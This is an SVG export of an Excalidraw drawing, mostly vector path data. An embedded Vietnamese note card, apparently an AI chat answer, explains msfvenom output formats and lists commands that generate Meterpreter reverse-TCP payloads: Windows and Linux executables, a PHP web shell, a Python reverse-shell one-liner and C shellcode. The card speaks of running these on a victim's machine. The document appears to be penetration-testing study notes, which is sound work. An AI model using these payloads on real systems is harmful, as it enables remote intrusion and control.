<path d="M1519.00 4509.34 L1518.27 4508.90 L1518.55 4508.03 L1519.95 4507.65 L1522.20 4507.03 L1526.02 4506.03 L1527.31 4505.65 L1528.77 4505.34 L1528.77 4505.34" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1535.33 4568.31 L1537.30 4565.30 L1538.42 4562.99 L1539.54 4560.11 L1540.56 4557.11 L1541.29 4554.42 L1541.79 4551.67 L1542.24 4549.42 L1542.46 4547.67 L1542.58 4546.48 L1542.41 4545.11 L1541.79 4544.36 L1540.39 4545.73 L1539.15 4547.61 L1538.48 4548.80 L1537.13 4551.42 L1535.95 4554.55 L1534.94 4557.49 L1534.10 4560.36 L1533.54 4563.12 L1533.20 4565.87 L1533.20 4568.37 L1533.54 4570.56 L1534.04 4572.56 L1534.89 4574.25 L1535.78 4575.31 L1536.74 4575.87 L1537.75 4576.06 L1538.82 4575.87 L1541.06 4574.94 L1542.74 4573.93 L1543.31 4573.43 L1545.22 4571.81 L1545.89 4571.31 L1546.51 4570.62 L1546.51 4571.75 L1546.39 4572.81 L1546.51 4574.06 L1546.79 4574.99 L1547.57 4575.68 L1547.57 4575.68" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1556.05 4558.49 L1556.05 4558.49" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1558.63 4566.12 L1557.90 4565.43 L1556.89 4564.93 L1555.94 4564.81 L1554.70 4565.05 L1553.97 4565.49 L1553.52 4566.18 L1553.36 4567.37 L1553.97 4569.49 L1554.70 4571.31 L1555.54 4573.12 L1555.94 4573.87 L1556.50 4575.18 L1557.06 4576.25 L1557.45 4577.18 L1557.90 4578.25 L1558.02 4579.44 L1557.79 4580.37 L1557.23 4581.12 L1556.67 4581.69 L1556.67 4581.69" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1567.00 4563.93 L1566.32 4564.43 L1565.82 4565.24 L1565.14 4567.12 L1564.47 4569.31 L1563.85 4571.75 L1563.46 4574.18 L1563.18 4576.56 L1563.01 4577.56 L1562.84 4579.37 L1562.79 4580.75 L1562.73 4582.12 L1562.62 4580.18 L1562.51 4578.31 L1562.39 4576.94 L1562.39 4575.81 L1562.62 4574.75 L1563.63 4574.94 L1566.10 4576.12 L1568.01 4576.94 L1570.03 4577.62 L1571.04 4577.94 L1572.72 4578.25 L1574.18 4578.31 L1575.31 4578.06 L1576.32 4577.75 L1577.05 4577.25 L1577.66 4576.56 L1578.06 4575.81 L1578.34 4574.68 L1578.28 4573.43 L1577.66 4572.81 L1575.92 4573.81 L1574.58 4575.31 L1573.45 4577.00 L1572.67 4578.75 L1572.27 4580.37 L1572.22 4581.69 L1572.44 4582.94 L1572.84 4583.88 L1573.29 4584.69 L1574.18 4585.50 L1575.25 4585.63 L1577.66 4584.94 L1579.46 4584.12 L1581.20 4583.19 L1581.87 4582.75 L1583.11 4582.12 L1583.90 4581.69 L1584.85 4581.25 L1585.52 4581.75 L1585.36 4582.81 L1585.19 4583.88 L1585.13 4585.00 L1585.80 4585.50 L1586.65 4585.19 L1587.55 4584.81 L1588.61 4584.69 L1589.51 4585.00 L1590.24 4585.63 L1592.09 4587.44 L1592.99 4588.44 L1593.66 4589.38 L1593.66 4589.38" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1326.89 4297.12 L1326.10 4297.44 L1326.32 4298.31 L1327.33 4298.75 L1328.29 4299.25 L1330.48 4300.31 L1332.16 4301.06 L1334.02 4301.69 L1335.98 4302.50 L1338.28 4303.25 L1340.81 4304.00 L1343.45 4304.63 L1344.79 4304.94 L1347.66 4305.57 L1351.81 4306.31 L1354.45 4306.75 L1356.92 4307.25 L1359.28 4307.50 L1361.41 4307.82 L1362.37 4308.01 L1364.16 4308.13 L1366.24 4308.38 L1368.49 4308.50 L1370.96 4308.57 L1373.59 4308.63 L1376.23 4308.63 L1378.87 4308.57 L1382.97 4308.50 L1385.55 4308.44 L1388.02 4308.38 L1389.14 4308.38 L1391.22 4308.38 L1392.91 4308.25 L1394.53 4308.38 L1396.95 4308.38 L1399.36 4308.50 L1401.78 4308.57 L1404.02 4308.75 L1405.09 4308.82 L1406.89 4308.94 L1408.40 4309.13 L1410.87 4309.38 L1411.88 4309.57 L1413.51 4309.82 L1414.91 4310.07 L1416.15 4310.32 L1418.51 4310.69 L1420.53 4311.07 L1421.71 4311.32 L1423.78 4311.51 L1426.14 4311.82 L1428.50 4312.07 L1430.52 4312.13 L1432.32 4312.25 L1433.83 4312.38 L1435.24 4312.44 L1436.53 4312.51 L1437.76 4312.57 L1439.05 4312.76 L1441.13 4312.82 L1442.98 4312.88 L1446.18 4312.88 L1448.82 4312.88 L1452.75 4312.82 L1455.33 4312.82 L1456.46 4312.76 L1458.42 4312.76 L1461.45 4312.76 L1462.63 4312.76 L1464.26 4312.76 L1465.61 4312.63 L1466.96 4312.63 L1468.42 4312.63 L1470.27 4312.63 L1472.79 4312.57 L1474.82 4312.51 L1476.61 4312.51 L1478.13 4312.44 L1479.42 4312.38 L1480.60 4312.38 L1481.72 4312.25 L1483.24 4312.19 L1484.70 4312.13 L1487.17 4311.94 L1488.23 4311.88 L1491.32 4311.69 L1492.39 4311.57 L1495.76 4311.38 L1498.11 4311.13 L1499.35 4311.07 L1501.76 4310.82 L1504.29 4310.63 L1506.87 4310.32 L1509.57 4310.01 L1513.61 4309.50 L1516.36 4309.13 L1519.22 4308.63 L1520.68 4308.50 L1523.71 4308.06 L1526.75 4307.50 L1529.83 4307.06 L1532.81 4306.63 L1535.78 4306.19 L1538.65 4305.69 L1541.34 4305.31 L1543.92 4305.06 L1546.34 4304.82 L1548.81 4304.56 L1551.22 4304.44 L1553.75 4304.25 L1556.16 4304.13 L1558.86 4303.88 L1561.66 4303.75 L1564.58 4303.50 L1566.10 4303.44 L1569.13 4303.25 L1572.16 4303.00 L1575.08 4302.94 L1579.24 4302.69 L1581.93 4302.63 L1584.51 4302.56 L1585.75 4302.56 L1588.16 4302.38 L1590.46 4302.31 L1593.10 4302.31 L1595.69 4302.25 L1598.38 4302.31 L1601.07 4302.31 L1603.77 4302.38 L1606.46 4302.56 L1609.22 4302.63 L1611.91 4302.75 L1614.60 4302.88 L1617.36 4303.00 L1619.99 4303.00 L1622.41 4303.06 L1624.32 4303.06 L1625.78 4303.06 L1627.01 4303.06 L1628.08 4303.13 L1629.37 4303.13 L1630.55 4303.25 L1631.78 4303.25 L1632.96 4303.31 L1634.25 4303.31 L1635.54 4303.38 L1636.84 4303.38 L1636.84 4303.38" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1024.18 4323.38 L1026.20 4322.64 L1027.32 4322.32 L1029.90 4321.89 L1032.77 4321.63 L1035.91 4321.57 L1039.39 4321.70 L1043.54 4321.95 L1047.98 4322.32 L1052.81 4322.76 L1057.75 4323.20 L1062.86 4323.76 L1067.63 4324.26 L1072.29 4324.89 L1074.65 4325.20 L1079.25 4325.82 L1083.80 4326.45 L1090.70 4327.08 L1095.53 4327.26 L1100.58 4327.45 L1105.75 4327.51 L1110.80 4327.51 L1113.22 4327.57 L1117.82 4327.64 L1122.09 4327.89 L1125.79 4328.20 L1129.10 4328.51 L1132.19 4328.89 L1135.11 4329.26 L1137.80 4329.64 L1140.39 4330.01 L1142.86 4330.32 L1145.55 4330.51 L1148.30 4330.70 L1151.11 4330.70 L1153.86 4330.70 L1156.50 4330.76 L1157.79 4330.83 L1160.15 4330.89 L1161.22 4330.95 L1163.07 4331.08 L1164.64 4331.14 L1166.10 4331.20 L1170.20 4331.45 L1172.44 4331.39 L1173.73 4331.39 L1176.37 4331.14 L1179.01 4330.89 L1181.59 4330.70 L1184.12 4330.39 L1186.65 4330.20 L1189.06 4330.01 L1190.07 4329.95 L1191.98 4329.83 L1193.66 4329.76 L1196.86 4329.64 L1199.39 4329.39 L1201.92 4329.08 L1204.61 4328.83 L1207.31 4328.51 L1209.89 4328.20 L1211.12 4328.14 L1213.54 4327.89 L1215.90 4327.76 L1217.86 4327.64 L1219.54 4327.64 L1222.69 4327.76 L1224.93 4327.83 L1226.23 4327.83 L1228.75 4327.89 L1231.28 4327.89 L1233.92 4327.83 L1236.72 4327.76 L1239.70 4327.57 L1242.56 4327.39 L1245.48 4327.14 L1246.83 4327.08 L1249.58 4326.83 L1252.11 4326.76 L1254.46 4326.64 L1256.20 4326.51 L1257.72 4326.45 L1259.01 4326.45 L1260.42 4326.45 L1261.65 4326.39 L1262.94 4326.39 L1264.18 4326.39 L1265.36 4326.32 L1265.36 4326.32" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1169.02 4373.22 L1168.12 4372.84 L1167.22 4372.59 L1166.49 4372.22 L1167.45 4372.03 L1168.74 4372.16 L1171.66 4372.72 L1174.35 4373.10 L1177.22 4373.59 L1181.93 4374.22 L1185.47 4374.66 L1189.34 4375.10 L1193.05 4375.54 L1194.67 4375.72 L1197.93 4376.22 L1200.96 4376.78 L1203.83 4377.29 L1206.46 4377.85 L1209.05 4378.29 L1211.69 4378.66 L1214.55 4378.85 L1219.21 4379.03 L1220.95 4378.97 L1224.43 4378.72 L1228.30 4378.47 L1232.12 4378.10 L1235.54 4377.72 L1238.69 4377.47 L1241.72 4377.22 L1244.42 4377.10 L1247.17 4376.91 L1248.51 4376.85 L1251.04 4376.78 L1254.74 4376.78 L1256.71 4376.78 L1258.79 4376.91 L1261.09 4377.16 L1263.39 4377.54 L1265.64 4377.91 L1266.70 4378.10 L1268.67 4378.60 L1270.46 4378.97 L1272.49 4379.54 L1274.56 4379.85 L1276.64 4380.41 L1279.50 4380.91 L1281.19 4381.16 L1283.26 4381.54 L1285.00 4381.85 L1287.64 4382.29 L1289.72 4382.66 L1290.67 4382.79 L1292.47 4383.04 L1294.10 4383.16 L1295.50 4383.22 L1298.82 4383.35 L1301.23 4383.22 L1303.59 4383.22 L1306.06 4383.10 L1307.35 4383.04 L1310.66 4382.85 L1312.51 4382.72 L1314.14 4382.72 L1315.66 4382.66 L1317.00 4382.60 L1318.91 4382.48 L1321.16 4382.35 L1322.39 4382.29 L1325.31 4382.10 L1327.56 4381.97 L1328.57 4381.85 L1331.60 4381.72 L1332.61 4381.66 L1334.52 4381.60 L1336.20 4381.60 L1339.07 4381.60 L1340.25 4381.60 L1342.66 4381.66 L1345.24 4381.72 L1347.88 4381.85 L1352.04 4381.91 L1354.73 4381.91 L1357.31 4381.97 L1359.67 4382.04 L1361.52 4382.04 L1363.15 4382.04 L1364.56 4382.10 L1365.90 4382.10 L1367.14 4382.10 L1370.39 4382.04 L1373.09 4381.91 L1377.24 4381.54 L1378.59 4381.41 L1381.17 4381.22 L1383.42 4381.04 L1385.33 4380.91 L1386.84 4380.85 L1388.19 4380.78 L1389.37 4380.66 L1390.44 4380.60 L1391.95 4380.54 L1394.98 4380.29 L1397.40 4380.04 L1399.70 4379.72 L1402.06 4379.35 L1403.12 4379.29 L1404.86 4379.03 L1406.38 4378.85 L1407.56 4378.72 L1408.68 4378.66 L1409.75 4378.60 L1411.10 4378.47 L1412.50 4378.41 L1414.58 4378.35 L1415.81 4378.22 L1417.83 4378.10 L1419.57 4377.97 L1421.14 4377.91 L1422.60 4377.85 L1423.90 4377.85 L1426.31 4377.72 L1428.11 4377.72 L1429.85 4377.72 L1431.19 4377.72 L1432.49 4377.66 L1433.61 4377.66 L1434.67 4377.72 L1436.02 4377.72 L1437.15 4377.72 L1438.38 4377.85 L1439.50 4377.85 L1440.85 4377.72 L1443.71 4377.66 L1444.78 4377.60 L1446.52 4377.47 L1448.04 4377.35 L1449.27 4377.29 L1450.45 4377.22 L1451.85 4377.10 L1453.14 4376.97 L1454.38 4376.91 L1455.62 4376.78 L1458.65 4376.47 L1460.39 4376.22 L1461.73 4376.10 L1462.80 4375.91 L1463.81 4375.78 L1464.93 4375.47 L1466.06 4375.16 L1467.12 4374.72 L1469.31 4373.91 L1470.72 4373.22 L1471.78 4372.72 L1472.63 4372.22 L1473.36 4371.72 L1474.20 4371.03 L1474.87 4370.28 L1475.32 4369.53 L1475.77 4368.53 L1475.88 4367.28 L1475.49 4366.53 L1474.48 4365.41 L1473.02 4364.15 L1471.50 4363.03 L1469.99 4361.97 L1469.14 4361.46 L1467.80 4360.71 L1466.73 4360.03 L1465.66 4359.46 L1464.60 4359.09 L1462.13 4358.34 L1459.94 4357.90 L1457.47 4357.52 L1454.89 4357.28 L1452.30 4357.15 L1449.61 4357.03 L1448.15 4357.03 L1445.40 4357.03 L1442.65 4357.09 L1439.95 4357.15 L1437.20 4357.28 L1434.56 4357.46 L1430.69 4357.71 L1428.11 4357.90 L1425.47 4358.09 L1424.23 4358.15 L1421.76 4358.28 L1419.29 4358.46 L1416.77 4358.59 L1414.30 4358.71 L1411.77 4358.90 L1409.30 4359.03 L1406.83 4359.21 L1404.30 4359.34 L1401.89 4359.46 L1399.47 4359.65 L1397.45 4359.71 L1395.71 4359.78 L1394.20 4359.84 L1392.79 4359.84 L1391.50 4359.96 L1389.59 4359.96 L1387.18 4360.09 L1385.16 4360.15 L1383.25 4360.28 L1378.82 4360.46 L1376.23 4360.65 L1373.76 4360.78 L1371.29 4360.90 L1368.77 4361.09 L1366.30 4361.28 L1365.06 4361.40 L1362.76 4361.53 L1360.23 4361.65 L1357.82 4361.90 L1355.35 4362.22 L1352.93 4362.46 L1349.17 4362.84 L1346.76 4362.97 L1344.51 4363.22 L1343.45 4363.28 L1341.54 4363.34 L1339.97 4363.40 L1338.62 4363.46 L1337.33 4363.59 L1336.20 4363.65 L1335.03 4363.71 L1334.02 4363.78 L1331.15 4364.03 L1330.09 4364.09 L1328.18 4364.22 L1326.44 4364.34 L1324.92 4364.41 L1323.57 4364.46 L1322.28 4364.46 L1319.87 4364.53 L1318.02 4364.53 L1316.16 4364.53 L1313.75 4364.41 L1309.48 4364.22 L1306.90 4364.15 L1304.32 4364.09 L1301.68 4363.97 L1299.04 4363.84 L1296.57 4363.71 L1294.10 4363.46 L1291.69 4363.34 L1290.62 4363.22 L1288.26 4362.97 L1286.07 4362.71 L1283.83 4362.46 L1281.92 4362.22 L1280.34 4362.03 L1278.89 4361.84 L1277.65 4361.65 L1274.84 4361.28 L1273.72 4361.09 L1271.42 4360.65 L1269.23 4360.15 L1267.21 4359.71 L1265.07 4359.21 L1263.05 4358.65 L1260.02 4357.90 L1259.12 4357.71 L1257.27 4357.15 L1255.64 4356.77 L1253.85 4356.34 L1251.77 4355.90 L1249.58 4355.40 L1247.28 4355.02 L1245.09 4354.71 L1242.84 4354.34 L1240.60 4354.09 L1238.46 4353.77 L1237.51 4353.59 L1234.14 4353.09 L1233.13 4352.96 L1231.39 4352.71 L1229.76 4352.46 L1226.79 4352.27 L1225.72 4352.09 L1223.81 4352.02 L1222.07 4351.96 L1220.50 4351.90 L1218.03 4351.90 L1215.67 4351.90 L1213.20 4351.77 L1209.33 4351.65 L1206.75 4351.65 L1204.05 4351.65 L1201.47 4351.77 L1198.83 4351.90 L1197.59 4351.96 L1195.07 4352.09 L1192.60 4352.34 L1190.02 4352.52 L1187.55 4352.84 L1185.02 4353.21 L1182.72 4353.59 L1180.58 4353.90 L1178.96 4354.21 L1177.50 4354.52 L1176.20 4354.71 L1174.18 4355.21 L1172.44 4355.52 L1170.98 4355.77 L1169.80 4356.03 L1168.74 4356.28 L1167.78 4356.46 L1166.55 4356.77 L1165.43 4357.03 L1164.30 4357.40 L1163.24 4357.71 L1162.23 4357.90 L1161.44 4358.21 L1160.32 4358.52 L1159.36 4358.84 L1158.41 4359.03 L1157.96 4359.71 L1158.41 4360.71 L1159.53 4362.28 L1160.77 4363.78 L1162.11 4365.41 L1163.52 4366.78 L1165.82 4368.91 L1167.39 4370.16 L1168.91 4371.09 L1168.91 4371.09" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1507.88 4623.83 L1509.29 4623.83 L1511.36 4623.71 L1513.89 4623.58 L1516.70 4623.45 L1519.78 4623.33 L1523.04 4623.27 L1526.46 4623.27 L1529.89 4623.33 L1531.74 4623.33 L1537.02 4623.45 L1540.50 4623.64 L1543.87 4623.71 L1547.18 4623.83 L1550.38 4623.96 L1551.95 4624.08 L1554.98 4624.21 L1557.96 4624.52 L1561.05 4624.77 L1564.19 4625.08 L1567.33 4625.46 L1572.16 4625.83 L1573.85 4625.96 L1577.16 4626.21 L1580.47 4626.39 L1583.84 4626.58 L1587.21 4626.64 L1590.41 4626.71 L1593.50 4626.71 L1595.12 4626.71 L1598.04 4626.64 L1600.91 4626.58 L1603.66 4626.52 L1607.70 4626.21 L1610.79 4626.15 L1614.10 4626.15 L1615.78 4626.02 L1619.10 4626.02 L1622.41 4625.96 L1625.72 4625.89 L1628.92 4625.89 L1631.84 4625.89 L1634.65 4625.89 L1635.99 4625.89 L1638.35 4625.96 L1640.32 4625.96 L1642.06 4626.02 L1643.46 4626.21 L1644.81 4626.27 L1646.55 4626.58 L1647.56 4626.71 L1649.13 4627.02 L1650.37 4627.27 L1651.32 4627.46 L1651.32 4627.46" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1060.84 4636.28 L1060.33 4635.52 L1059.66 4635.09 L1060.78 4635.02 L1063.92 4635.28 L1067.12 4635.46 L1070.83 4635.71 L1074.98 4636.02 L1079.36 4636.28 L1081.55 4636.46 L1085.76 4636.77 L1089.75 4637.15 L1093.06 4637.34 L1096.26 4637.59 L1100.47 4637.96 L1102.94 4638.28 L1105.36 4638.46 L1107.26 4638.71 L1108.89 4638.84 L1110.30 4639.03 L1111.47 4639.09 L1112.60 4639.21 L1113.66 4639.34 L1115.12 4639.46 L1116.42 4639.46 L1117.54 4639.52 L1117.54 4639.52" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1014.44 4640.71 C1257.50 4642.28,1502.50 4641.64,1669.88 4641.31 M1014.03 4641.32 C1261.02 4640.27,1508.84 4640.49,1670.22 4640.67 M1670.59 4640.86 C1668.78 4661.91,1671.58 4678.97,1668.90 4702.69 M1669.43 4641.61 C1670.51 4656.35,1670.39 4672.39,1670.17 4701.94 M1669.47 4701.65 C1529.36 4701.81,1387.95 4701.87,1013.76 4702.86 M1670.44 4702.39 C1420.51 4704.36,1170.68 4704.28,1013.68 4702.61 M1012.40 4700.40 C1013.14 4682.61,1012.00 4664.38,1012.85 4642.15 M1012.99 4702.32 C1012.65 4678.53,1014.27 4654.68,1014.08 4641.56" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M927.73 4549.61 L927.50 4548.67 L927.28 4547.67 L927.22 4546.61 L927.84 4545.98 L929.07 4545.98 L930.76 4546.36 L933.12 4547.05 L935.42 4547.98 L937.72 4549.24 L939.69 4550.74 L941.48 4552.55 L942.21 4553.55 L943.84 4555.74 L945.75 4559.37 L946.98 4561.86 L948.27 4564.74 L949.45 4567.43 L950.63 4570.06 L951.64 4572.68 L952.65 4575.43 L953.10 4576.81 L953.94 4579.50 L954.67 4582.31 L955.35 4585.06 L955.91 4587.94 L956.64 4592.19 L957.15 4595.13 L957.76 4598.07 L958.32 4600.95 L958.66 4602.38 L959.33 4605.32 L960.18 4608.45 L960.96 4611.58 L961.86 4614.95 L962.82 4618.21 L963.60 4621.39 L964.33 4624.33 L965.12 4627.15 L965.68 4630.02 L966.46 4632.90 L967.14 4635.65 L967.87 4638.28 L968.65 4640.78 L969.38 4643.03 L970.23 4645.15 L971.07 4647.15 L971.97 4648.90 L972.81 4650.47 L974.32 4652.72 L975.00 4653.59 L975.67 4654.35 L976.29 4655.03 L976.85 4655.53 L977.47 4656.03 L978.98 4657.10 L980.11 4657.97 L981.17 4658.60 L982.07 4659.16 L982.91 4659.60 L983.98 4660.03 L985.10 4660.35 L986.23 4660.54 L987.29 4660.66 L988.42 4660.78 L989.59 4660.97 L990.77 4661.04 L990.77 4661.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M927.95 4563.05 L927.95 4561.68 L928.06 4560.18 L928.06 4555.99 L928.12 4552.92 L928.12 4549.86 L928.18 4546.98 L928.18 4544.36 L928.18 4543.23 L928.18 4541.42 L928.29 4539.92 L928.18 4538.79 L928.18 4537.29 L928.18 4536.10 L928.12 4534.92 L927.95 4533.73 L927.95 4532.61 L928.06 4531.48 L928.57 4530.73 L930.82 4529.98 L933.00 4529.42 L935.42 4529.10 L937.78 4529.10 L940.36 4529.48 L942.83 4530.23 L945.41 4531.48 L945.41 4531.48" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="177.56" y="4807.70" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="177.56" dy="0">IV)</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">

<rect x="247.85162673920718" y="4830.4114744906365" width="745.0850996105024" height="1215.4200687396321" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="247.85162673920718" y="4830.4114744906365" width="745.0850996105024" height="1215.4200687396321" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📘 Hai loại định dạng output của msfvenom:</span>
      </div>
      <a href="#doc-cc2b6d1632783b97b2b0fbf07bdc27a8e0bd0992" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Ok mày, tao giải thích ngắn gọn phần này:</p>
<h3>📘 Hai loại định dạng output của msfvenom:</h3>
<ul>
<li><p><strong>Executable formats</strong> – tạo ra file nhị phân chạy trực tiếp trên OS mục tiêu.<br>Ví dụ: <code>exe</code> (Windows), <code>elf</code> (Linux), <code>macho</code> (macOS), <code>msi</code> (Windows Installer), <code>apk</code> (Android), <code>war</code> (Java web app).<br>→ Dùng khi mày cần <strong>thả file vào máy nạn nhân và bắt nó chạy</strong>.</p>
</li>
<li><p><strong>Transform formats</strong> – tạo ra mã nguồn hoặc dữ liệu thô để <strong>nhúng vào tool/script khác</strong>.<br>Ví dụ: <code>raw</code> (bytes thô), <code>c</code> (mảng C), <code>csharp</code> (mảng C#), <code>python</code> (chuỗi Python), <code>powershell</code> (mã PowerShell), <code>hex</code> (chuỗi hex), <code>base64</code>.<br>→ Dùng khi mày <strong>tự build exploit</strong>, nhúng shellcode vào loader, hoặc chạy lệnh qua injection mà không cần ghi file.</p>
</li>
</ul>
<h3>🎯 Nguyên tắc chọn:</h3>
<ul>
<li>Cần <strong>file chạy được</strong> → dùng executable format.  </li>
<li>Cần <strong>dữ liệu để nhúng</strong> → dùng transform format.</li>
</ul>
<h3>🧪 Các &quot;công thức&quot; payload thường gặp:</h3>
<table>
<thead>
<tr>
<th>Kịch bản</th>
<th>Payload</th>
<th>Định dạng</th>
<th>Ghi chú</th>
</tr>
</thead>
<tbody><tr>
<td>Windows file <code>.exe</code></td>
<td><code>windows/x64/meterpreter_reverse_tcp</code></td>
<td><code>-f exe</code></td>
<td>Stageless cho file standalone. Nạn nhân chạy file → gọi về handler.</td>
</tr>
<tr>
<td>Linux file <code>.elf</code></td>
<td><code>linux/x64/meterpreter_reverse_tcp</code></td>
<td><code>-f elf</code></td>
<td>Chuyển qua SSH/SCP, xong <code>chmod +x shell.elf</code> rồi <code>./shell.elf</code>.</td>
</tr>
<tr>
<td>PHP web shell</td>
<td><code>php/meterpreter_reverse_tcp</code></td>
<td><code>-f raw</code></td>
<td>Upload lên web PHP, truy cập URL để kích hoạt. Nhớ sửa tag <code>&lt;?php</code> nếu bị comment.</td>
</tr>
<tr>
<td>Python one-liner</td>
<td><code>cmd/unix/reverse_python</code></td>
<td><code>-f raw</code></td>
<td>Không cần ghi file, dán thẳng vào terminal nạn nhân.</td>
</tr>
<tr>
<td>Raw shellcode C</td>
<td><code>windows/x64/meterpreter_reverse_tcp</code></td>
<td><code>-f c</code></td>
<td>Dùng để nhúng vào exploit tự viết. Xuất mảng byte C.</td>
</tr>
</tbody></table>
<h3>💡 Ví dụ nhanh:</h3>
<pre><code class="language-bash"># Tạo file .exe cho Windows
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Tạo file .elf cho Linux
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# Tạo PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# Tạo Python one-liner (in ra terminal)
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=4444 -f raw

# Tạo raw shellcode dạng C
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f c
</code></pre>
<p>➡️ <strong>Tóm gọn:</strong> Chọn <code>-f</code> theo nhu cầu: file chạy (<code>exe</code>, <code>elf</code>, <code>apk</code>...) hoặc mã để nhúng (<code>raw</code>, <code>c</code>, <code>python</code>, <code>powershell</code>...). Với file standalone thì nên dùng <strong>stageless</strong> (<code>_</code>) cho đáng tin.</p>
<p>Cần ví dụ thêm hay đào sâu chỗ nào thì hỏi nhé! 😎</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-56.74,-107.24)">
<path d="M290.80 5042.04 L293.11 5043.03 L297.02 5044.48 L298.44 5044.88 L301.35 5045.67 L304.55 5046.40 L309.35 5047.45 L312.55 5047.98 L315.69 5048.57 L319.01 5048.97 L320.67 5049.04 L323.93 5049.17 L327.36 5049.17 L330.68 5049.04 L334.18 5048.84 L337.62 5048.71 L341.05 5048.57 L345.91 5048.44 L348.93 5048.38 L350.36 5048.44 L353.26 5048.57 L355.93 5048.57 L358.59 5048.64 L361.14 5048.71 L363.75 5048.64 L366.30 5048.64 L368.67 5048.64 L369.85 5048.57 L371.93 5048.57 L373.70 5048.57 L375.30 5048.64 L376.67 5048.71 L379.75 5049.04 L381.76 5049.10 L384.19 5049.23 L386.62 5049.23 L389.41 5049.04 L392.25 5048.57 L393.67 5048.24 L396.46 5047.71 L399.19 5047.19 L402.86 5046.53 L403.99 5046.40 L405.82 5046.26 L407.30 5046.13 L408.67 5046.13 L409.85 5046.13 L411.04 5046.13 L412.64 5046.13 L414.24 5046.07 L416.07 5046.13 L417.20 5046.07 L419.10 5046.00 L421.88 5046.00 L423.01 5046.07 L424.43 5046.07 L425.79 5046.07 L427.22 5046.07 L428.34 5046.00 L429.35 5045.87 L430.42 5045.67 L431.42 5045.54 L432.73 5045.27 L433.67 5044.94 L434.62 5044.61 L435.69 5044.35 L436.64 5043.95 L437.59 5043.43 L438.36 5042.96 L439.19 5042.50 L439.90 5041.91 L440.43 5041.31 L440.90 5040.59 L441.26 5039.53 L441.02 5038.54 L439.90 5037.42 L438.12 5036.30 L435.93 5035.31 L433.26 5034.51 L431.78 5034.12 L428.28 5033.53 L424.19 5033.00 L419.75 5032.60 L415.07 5032.40 L410.03 5032.40 L404.99 5032.40 L397.17 5032.67 L392.02 5033.00 L389.47 5033.20 L384.55 5033.59 L379.69 5033.92 L375.07 5034.12 L370.50 5034.45 L366.30 5034.58 L362.62 5034.84 L359.13 5034.98 L355.69 5035.18 L354.09 5035.31 L349.35 5035.51 L346.33 5035.64 L343.19 5035.84 L340.22 5035.97 L337.38 5036.10 L334.59 5036.30 L331.99 5036.43 L329.26 5036.69 L326.65 5037.03 L325.35 5037.09 L322.80 5037.42 L320.25 5037.68 L316.34 5038.28 L313.91 5038.67 L311.48 5039.07 L309.29 5039.47 L307.51 5039.80 L305.91 5040.13 L304.55 5040.33 L301.88 5040.98 L300.28 5041.31 L298.92 5041.64 L297.62 5041.84 L296.49 5042.11 L295.01 5042.30 L293.64 5042.57 L292.46 5042.83 L291.33 5042.96 L290.33 5043.16 L289.26 5043.29 L288.13 5043.43 L286.95 5043.56 L286.95 5043.56" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
